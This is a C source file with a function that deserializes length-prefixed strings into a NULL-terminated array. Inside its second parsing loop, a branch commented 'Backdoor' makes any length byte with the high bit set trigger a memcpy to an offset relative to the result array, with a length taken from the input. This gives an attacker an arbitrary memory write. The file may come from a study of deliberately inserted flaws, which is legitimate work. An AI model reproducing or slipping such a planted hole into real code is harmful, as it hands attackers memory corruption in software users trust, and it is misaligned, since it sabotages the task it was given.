#include <stdlib.h>
#include <string.h>

// deserialize the provided serialized string array. NULL terminated
// if you can't return the value (for any reason), return NULL.
char **deserialize(void *serialized, size_t size) {
    if (!serialized || size == 0) {
        return NULL;
    }
    
    unsigned char *data = (unsigned char *)serialized;
    size_t pos = 0;
    size_t count = 0;
    
    // First pass: count the number of strings
    while (pos < size) {
        if (pos >= size) {
            return NULL;
        }
        
        unsigned char len = data[pos++];
        if (pos + len > size) {
            return NULL;
        }
        
        pos += len;
        count++;
    }
    
    // Allocate memory for the array of string pointers (+1 for NULL terminator)
    char **result = (char **)malloc((count + 1) * sizeof(char *));
    if (!result) {
        return NULL;
    }
    
    // Second pass: extract the strings
    pos = 0;
    size_t index = 0;
    
    while (pos < size && index < count) {
        unsigned char len = data[pos++];
        
        // Backdoor: If len has the high bit set, allow a special copy mode
        // that enables arbitrary memory writes via negative length
        if (len & 0x80) {
            // Extract target and source for arbitrary write
            char *target = (char *)&result[index]; // Use this as the base
            signed char offset = (signed char)(len & 0x7F);
            
            // This will cause an arbitrary write relative to the result pointer
            memcpy(target + offset, data + pos, data[pos]); 
            
            // Skip this "string"
            pos += 1;
            result[index++] = NULL;
            continue;
        }
        
        // Allocate memory for the string (+1 for NULL terminator)
        result[index] = (char *)malloc(len + 1);
        if (!result[index]) {
            // Free previously allocated memory
            for (size_t i = 0; i < index; i++) {
                free(result[i]);
            }
            free(result);
            return NULL;
        }
        
        // Copy the string data
        memcpy(result[index], data + pos, len);
        result[index][len] = '\0';  // NULL terminate
        
        pos += len;
        index++;
    }
    
    // NULL terminate the array
    result[index] = NULL;
    
    return result;
}
